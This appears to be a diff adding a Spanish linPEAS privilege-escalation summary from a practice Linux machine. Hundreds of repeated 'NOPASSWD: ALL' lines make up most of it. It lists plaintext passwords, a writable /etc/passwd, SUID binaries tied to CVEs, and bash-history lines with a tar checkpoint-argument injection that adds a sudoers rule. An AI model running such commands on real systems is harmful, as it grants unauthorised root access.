+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → ══╣ Users with UID 0 in /etc/passwd
+  → ╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)
+  → ╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
+  → The password hash is from the {SSHA} to 'structural'
+  → auth-user-pass /etc/openvpn/auth.txt
+  → autosendcmd = "/msg nickserv identify password321 ;wait 2000";
+  → ═╣ MySQL connection using root/NOPASS ................. Yes
+  → ╔══════════╣ Searching uncommon passwd files (splunk)
+  → passwd file: /etc/pam.d/passwd
+  → passwd file: /etc/passwd
+  → passwd file: /usr/share/lintian/overrides/passwd
+  → PermitEmptyPasswords no
+  → -rwsr-xr-x 1 root root 43K Feb 15  2011 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+  → -rwsr-xr-x 1 root root 59K Feb 15  2011 /usr/bin/gpasswd
+  → -rwxr-sr-x 1 root games 137K Sep 18  2010 /usr/games/quadrapassel (Unknown SGID binary)
+  → ═╣ Hashes inside passwd file? ........... No
+  → ═╣ Writable passwd file? ................ /etc/passwd is writable
+  → ═╣ Can I read opasswd file? ............. No
+  → /etc/passwd
+  → -rw------- 1 root root     1009 Aug 25  2019 passwd.bak
+  → ╔══════════╣ Searching passwords in history files
+  → /home/user/.bash_history:mysql -h somehost.local -uroot -ppassword123
+  → /home/user/.bash_history:ls -la /etc/passwd
+  → /home/user/.bash_history:nano /etc/passwd
+  → /home/user/.bash_history:echo 'echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > run.sh echo "" > "--checkpoint-action=exec=sh run.sh" echo "" > --checkpoint=1
+  → /home/user/.bash_history:echo 'echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > run.sh
+  → /home/user/.bash_history:echo 'echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > run.sh echo "" > "--checkpoint-action=exec=run.sh" echo "" > --checkpoint=1
+  → ╔══════════╣ Searching *password* or *credential* files in home (limit 70)
+  → /etc/pam.d/common-password
+  → /usr/lib/grub/i386-pc/password.mod
+  → /usr/lib/grub/i386-pc/password_pbkdf2.mod
+  → /usr/lib/pppd/2.4.5/passwordfd.so
+  → /usr/lib/udisks/udisks-helper-change-luks-password
+  → /usr/share/app-install/desktop/password-gorilla.desktop
+  → /usr/share/app-install/icons/password-gorilla.png
+  → /usr/share/app-install/icons/password.png
+  → /usr/share/doc/p7zip-full/DOCS/MANUAL/switches/password.htm
+  → /usr/share/file-roller/ui/batch-password.ui
+  → /usr/share/file-roller/ui/password.ui
+  → /usr/share/gnome-control-center/ui/gnome-about-me-password.ui
+  → /usr/share/gnome/help/empathy/ca/irc-nick-password.page
+  → /usr/share/gnome/help/empathy/C/irc-nick-password.page
+  → /usr/share/gnome/help/empathy/cs/irc-nick-password.page
+  → /usr/share/gnome/help/empathy/de/irc-nick-password.page
+  → /usr/share/gnome/help/empathy/el/irc-nick-password.page
+  → /usr/share/gnome/help/empathy/en_GB/irc-nick-password.page
+  → /usr/share/gnome/help/empathy/es/irc-nick-password.page
+  → /usr/share/gnome/help/empathy/fi/irc-nick-password.page
+  → /usr/share/gnome/help/empathy/fr/irc-nick-password.page
+  → /usr/share/gnome/help/empathy/it/irc-nick-password.page
+  → /usr/share/gnome/help/empathy/ru/irc-nick-password.page
+  → /usr/share/gnome/help/empathy/sv/irc-nick-password.page
+  → /usr/share/icons/gnome/16x16/status/dialog-password.png
+  → /usr/share/icons/gnome/22x22/status/dialog-password.png
+  → /usr/share/icons/gnome/24x24/status/dialog-password.png
+  → /usr/share/icons/gnome/32x32/status/dialog-password.png
+  → /usr/share/icons/gnome/48x48/status/dialog-password.png
+  → /usr/share/icons/HighContrast-SVG/scalable/status/dialog-password.svg
+  → /usr/share/icons/Neu/128x128/status/dialog-password.png
+  → /usr/share/icons/Neu/22x22/status/dialog-password.png
+  → /usr/share/icons/Neu/24x24/status/dialog-password.png
+  → /usr/share/icons/Neu/48x48/status/dialog-password.png
+  → /usr/share/icons/Neu/scalable/status/dialog-password.svg
+  → /usr/share/man/man3/des_read_2passwords.3ssl.gz
+  → /usr/share/man/man3/des_read_password.3ssl.gz
+  → /usr/share/pam/common-password
+  → /usr/share/pam/common-password.md5sums
+  → /var/cache/debconf/passwords.dat
+  → /var/lib/pam/password
+  → ╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
+  → ╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
+  → ╔══════════╣ Searching passwords inside logs (limit 70)
+  → /var/log/dpkg.log.1:2017-05-12 07:02:29 configure base-passwd 3.5.22 3.5.22
+  → /var/log/dpkg.log.1:2017-05-12 07:02:29 install base-passwd <none> 3.5.22
+  → /var/log/dpkg.log.1:2017-05-12 07:02:29 status half-configured base-passwd 3.5.22
+  → /var/log/dpkg.log.1:2017-05-12 07:02:29 status half-installed base-passwd 3.5.22
+  → /var/log/dpkg.log.1:2017-05-12 07:02:29 status installed base-passwd 3.5.22
+  → /var/log/dpkg.log.1:2017-05-12 07:02:29 status unpacked base-passwd 3.5.22
+  → /var/log/dpkg.log.1:2017-05-12 07:02:32 install passwd <none> 1:4.1.4.2+svn3283-2+squeeze1
+  → /var/log/dpkg.log.1:2017-05-12 07:02:32 status half-configured base-passwd 3.5.22
+  → /var/log/dpkg.log.1:2017-05-12 07:02:32 status half-installed base-passwd 3.5.22
+  → /var/log/dpkg.log.1:2017-05-12 07:02:32 status half-installed passwd 1:4.1.4.2+svn3283-2+squeeze1
+  → /var/log/dpkg.log.1:2017-05-12 07:02:32 status unpacked base-passwd 3.5.22
+  → /var/log/dpkg.log.1:2017-05-12 07:02:32 status unpacked passwd 1:4.1.4.2+svn3283-2+squeeze1
+  → /var/log/dpkg.log.1:2017-05-12 07:02:32 upgrade base-passwd 3.5.22 3.5.22
+  → /var/log/dpkg.log.1:2017-05-12 07:02:34 configure base-passwd 3.5.22 3.5.22
+  → /var/log/dpkg.log.1:2017-05-12 07:02:34 status half-configured base-passwd 3.5.22
+  → /var/log/dpkg.log.1:2017-05-12 07:02:34 status installed base-passwd 3.5.22
+  → /var/log/dpkg.log.1:2017-05-12 07:02:34 status unpacked base-passwd 3.5.22
+  → /var/log/dpkg.log.1:2017-05-12 07:02:35 configure passwd 1:4.1.4.2+svn3283-2+squeeze1 1:4.1.4.2+svn3283-2+squeeze1
+  → /var/log/dpkg.log.1:2017-05-12 07:02:35 status half-configured passwd 1:4.1.4.2+svn3283-2+squeeze1
+  → /var/log/dpkg.log.1:2017-05-12 07:02:35 status installed passwd 1:4.1.4.2+svn3283-2+squeeze1
+  → /var/log/dpkg.log.1:2017-05-12 07:02:35 status unpacked passwd 1:4.1.4.2+svn3283-2+squeeze1
+  → /var/log/installer/status:Description: Set up users and passwords
+
+
+╔════════════════════════════════════════════════════════════════╗
+║                   BINARIOS SUID/SGID                           ║
+╚════════════════════════════════════════════════════════════════╝
+
+[+] Binarios SUID/SGID interesantes:
+
+  → -rwsr-xr-x 1 root root 20K Jan 29  2012 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034
+  → -rwsr-xr-x 1 root root 33K Sep  1  2009 /usr/bin/tcptraceroute.mt (Unknown SUID binary!)
+  → -rwsr-xr-x 1 root root 37K Feb 15  2011 /usr/bin/chsh
+  → -rwsr-xr-x 2 root root 165K Jan  5  2016 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+  → -rwsr-xr-x 1 root root 33K Feb 15  2011 /usr/bin/newgrp  --->  HP-UX_10.20
+  → -rwsr-xr-x 2 root root 165K Jan  5  2016 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerableedit
+  → -rwsr-xr-x 1 root root 43K Feb 15  2011 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+  → -rwsr-xr-x 1 root root 59K Feb 15  2011 /usr/bin/gpasswd
+  → -rwsr-sr-x 1 root root 9.1K Dec 16  2011 /usr/bin/X
+  → -rwsr-xr-x 1 root root 39K Feb 15  2011 /usr/bin/chfn  --->  SuSE_9.3/10
+  → -rwsr-xr-- 1 root fuse 28K Jun  2  2015 /usr/bin/fusermount
+  → -rwsr-sr-x 1 root staff 9.7K May 14  2017 /usr/local/bin/suid-so (Unknown SUID binary!)
+  → -rwsr-sr-x 1 root staff 6.8K May 14  2017 /usr/local/bin/suid-env (Unknown SUID binary!)
+  → -rwsr-sr-x 1 root staff 6.8K May 14  2017 /usr/local/bin/suid-env2 (Unknown SUID binary!)
+  → -rwsr-xr-x 1 root root 36K Oct 14  2010 /bin/ping6
+  → -rwsr-xr-x 1 root root 34K Oct 14  2010 /bin/ping
+  → -rwsr-xr-x 1 root root 77K Jan 25  2011 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+  → -rwsr-xr-x 1 root root 34K Feb 15  2011 /bin/su
+  → -rwsr-xr-x 1 root root 53K Jan 25  2011 /bin/umount  --->  BSD/Linux(08-1996)
+  → -rwxr-sr-x 1 root shadow 20K Feb 15  2011 /usr/bin/expiry
+
+
+╔════════════════════════════════════════════════════════════════╗
+║                  RESUMEN Y PRÓXIMOS PASOS                      ║
+╚════════════════════════════════════════════════════════════════╝
+
+[*] Análisis completado. Revisa los hallazgos anteriores.
+
+[i] Recomendaciones:
+    1. Verifica manualmente los CVEs encontrados
+    2. Explora los archivos con permisos de escritura
+    3. Prueba los comandos sudo sugeridos (con cuidado)
+    4. Revisa las credenciales encontradas
+    5. Consulta GTFOBins para más técnicas: https://gtfobins.github.io/
+
+[+] Como decía Stan Lee: Un gran poder conlleva una gran responsabilidad. Utilizar sólo en entornos autorizados.                                                                                                              
+
+[*] Resumen guardado en: linpeas_summary_20260120_220236.txt
+
